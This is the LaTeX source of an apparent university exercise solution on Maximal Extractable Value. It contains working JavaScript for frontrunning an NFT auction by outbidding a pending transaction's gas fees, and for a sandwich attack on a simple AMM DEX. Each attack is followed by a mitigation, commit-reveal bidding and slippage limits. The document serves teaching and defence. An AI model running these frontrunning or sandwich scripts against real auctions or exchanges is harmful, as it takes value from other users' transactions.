\documentclass[12pt]{article}
\usepackage[utf8]{inputenc}
\usepackage{hyperref}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{geometry}
\usepackage{listings-solidity}  % Include Solidity highlighting
\usepackage{minted} % For advanced code listings
\usepackage{fancyhdr} % Adding package for header and footer
\usepackage{float} % For using H to place figures

% Define a custom minted style (optional)
\usemintedstyle{colorful} % You can choose from various styles like 'monokai', 'tango', 'colorful', etc.

% Custom color setup
\definecolor{bashtextcolor}{RGB}{0, 0, 0} % Define black color

% Define a new command for inline code using minted
\newcommand{\codeinline}[1]{\mintinline{text}{#1}}

\geometry{a4paper, margin=1in}

\title{Smart Contracts Exercise 08: \\ Maximal Extractable Value -- Solution}
\author{}
\date{}

% Define a new command for inline code with a dark background
\newcommand{\codeblack}[1]{%
  \texttt{\colorbox{black!7}{\textcolor{black}{#1}}}%
}

% Define a new command for inline code with a dark background
\newcommand{\codegrey}[1]{%
  \texttt{\colorbox{black!4}{\textcolor{black}{#1}}}%
}

% Define custom colors (optional)
\definecolor{myURLColor}{RGB}{0, 102, 204} % Example: A shade of blue

\hypersetup{
    colorlinks=true,        % Enable colored links
    linkcolor=blue,         % Color for internal links (e.g., \ref, \cite)
    citecolor=blue,         % Color for citations
    filecolor=magenta,      % Color for file links
    urlcolor=myURLColor     % Color for external URLs
}

% Define a style for code listings
\lstdefinestyle{mystyle}{
    backgroundcolor=\color{lightgray!20},   
    commentstyle=\color{green!50!black},
    keywordstyle=\color{blue},
    numberstyle=\tiny\color{gray},
    stringstyle=\color{red},
    basicstyle=\ttfamily\footnotesize,
    breakatwhitespace=false,         
    breaklines=true,                 
    captionpos=b,                    
    keepspaces=true,                 
    numbers=left,                    
    numbersep=5pt,                  
    showspaces=false,                
    showstringspaces=false,
    showtabs=false,                  
    tabsize=2
}

\lstset{style=mystyle}
\pagestyle{fancy}

% Define header and footer
\fancyhf{} % Clear current settings
\fancyhead[L]{Smart Contracts Exercise 08} % Left header
\fancyhead[R]{\thepage} % Right header with page number

\renewcommand{\headrulewidth}{0.4pt} % Line below header
% \renewcommand{\footrulewidth}{0.4pt} % Line above footer

\begin{document}

\maketitle

\noindent
The solved Exercise 08 - Maximal Extractable Value can be found in this \href{https://gitlab.fel.cvut.cz/radovluk/smart-contracts-exercises/-/tree/main/08-Maximal-Extractable-Value/solution/solution-code}{GitLab repository}.

\section*{Solution to Task 1: NFT Auction Frontrunning}

The solution employs the following strategy:

\begin{enumerate}
\item Monitor the mempool for the \texttt{endAuction()} transaction
\item Extract the gas parameters from the pending transaction
\item Submit our bid with higher gas parameters to ensure it gets mined first
\item Wait for our bid and the \texttt{endAuction()} transaction to be mined
\item Claim the NFT
\end{enumerate}

\noindent
\begin{minipage}{\textwidth}
\begin{minted}[bgcolor=gray!5, fontsize=\footnotesize]{javascript}
// See the mempool
pendingBlock = await network.provider.send("eth_getBlockByNumber", [
  "pending",
  false,
]);

// Use our explorer function to show detailed transaction info
targetTx = await exploreMempoolTransactions(
  pendingBlock.transactions,
  auction,
  "endAuction"
);
const frontrunTx = {
  to: auction.target,
  data: auction.interface.encodeFunctionData("bid"),
  value: ethers.parseEther("1.5") + 1n, // Bid 1.5 ETH + 1 wei
  type: 2, // EIP-1559 transaction
  maxPriorityFeePerGas: targetTx.maxPriorityFeePerGas + 1000000000n, // +1 Gwei
  maxFeePerGas: targetTx.maxFeePerGas + 1000000000n, // +1 Gwei
  gasLimit: 500000, // Ensure enough gas is provided
};

// Send our frontrunning transaction
await player.sendTransaction(frontrunTx);
console.log("Player sent frontrunning transaction");
\end{minted}
\end{minipage}

\subsubsection*{Possible Mitigation}

\textbf{Commit-Reveal Schemes}: Users first submit a hash of their bid (commit), and later reveal the actual bid value. This prevents frontrunning since the actual bid values aren't visible in the mempool.

\noindent
\begin{minipage}{\textwidth}
\begin{lstlisting}[language=Solidity]
function commitBid(bytes32 bidHash) external {
    commitments[msg.sender] = bidHash;
}

function revealBid(uint value, bytes32 secret) external payable {
    bytes32 commitment = keccak256(abi.encodePacked(value, secret));
    require(commitments[msg.sender] == commitment, "Invalid commitment");
    // Process the actual bid here
}
\end{lstlisting}
\end{minipage}

\section*{Solution to Task 2: Sandwich Attack on a DEX}

The vulnerability stems from how Automated Market Makers (AMMs) like SimpleDEX determine prices using the constant product formula ($x \cdot y = k$). When a large swap occurs, it significantly moves the price, creating profitable opportunities for attackers who can manipulate transaction ordering. The SimpleDEX contract implements the standard AMM functionality:

\noindent
\begin{minipage}{\textwidth}
\begin{lstlisting}[language=Solidity]
function ethToUsdc() public payable returns (uint usdcBought) {
    // Ensure the pool has liquidity before attempting a swap
    require(usdcReserve > 0 && ethReserve > 0, ZeroReserves());

    uint ethSold = msg.value;
    uint inputWithFee = ethSold * 997;

    // Calculate USDC output using constant product formula with fee: 
    // (x + dx * 0.997) * (y - dy) = x * y
    // where: x = ethReserve, y = usdcReserve, dx = ethSold, dy = usdcBought
    usdcBought = (inputWithFee * usdcReserve) / ((ethReserve * 1000) + inputWithFee);

    // Ensure the swap produces a meaningful amount of output tokens
    require(usdcBought > 0, InsufficientUsdcPurchase());

    // Transfer the USDC tokens to the user
    usdcToken.transfer(msg.sender, usdcBought);

    usdcReserve -= usdcBought;
    ethReserve += ethSold;

    // Emit event for off-chain tracking and transparency
    emit EthPurchase(msg.sender, usdcBought, ethSold);

    return usdcBought;
}
\end{lstlisting}
\end{minipage}

\noindent
The sandwich attack consists of three steps:

\begin{enumerate}
\item \textbf{Frontrun}: Buy tokens (swap ETH for USDC) before the victim's transaction, increasing the price
\item \textbf{Victim transaction}: Let the victim's swap execute at the now-worse price
\item \textbf{Backrun}: Sell the tokens (swap USDC back to ETH) after the victim's transaction, when the price is even higher
\end{enumerate}

\noindent
\begin{minipage}{\textwidth}
\begin{minted}[bgcolor=gray!5, fontsize=\footnotesize]{javascript}
// See the mempool
const pendingBlock = await network.provider.send("eth_getBlockByNumber", [
  "pending",
  false,
]);

// Use our explorer function to show detailed transaction info
const targetTx = await exploreMempoolTransactions(
  pendingBlock.transactions,
  simpleDEX,
  "ethToUsdc"
);

// Calculate ETH to use (all player's ETH minus some for gas)
const gasBuffer = ethers.parseEther("0.01"); // Keep 0.01 ETH for gas costs
const frontrunAmount = PLAYER_INITIAL_ETH - gasBuffer;
console.log(
  `\nExecuting frontrun: swapping ${ethers.formatEther(
    frontrunAmount
  )} ETH for USDC...`
);

const frontrunTx = await simpleDEX.connect(player).ethToUsdc({
  value: frontrunAmount,
  maxPriorityFeePerGas: targetTx.maxPriorityFeePerGas + BigInt(1000000000), // +1 Gwei
  maxFeePerGas: targetTx.maxFeePerGas + BigInt(1000000000), // +1 Gwei
});

mine(1);

// backrun the transaction
const backrunAmount = await usdcToken.balanceOf(player.address);
await usdcToken.connect(player).approve(simpleDEX.target, backrunAmount);
await simpleDEX.connect(player).usdcToEth(backrunAmount);
\end{minted}
\end{minipage}

\subsubsection*{Possible Mitigation}

DEX should support slippage tolerance to protect against significant price movements. If the price moves beyond the tolerance, the transaction reverts.

\begin{minted}[bgcolor=gray!5, fontsize=\footnotesize]{solidity}
function ethToUsdcWithSlippage(uint minUsdcOut) external payable {
    uint usdcBought = calculateOutput(msg.value);
    require(usdcBought >= minUsdcOut, "Slippage exceeded");
    // Execute the swap
}
\end{minted}

\end{document}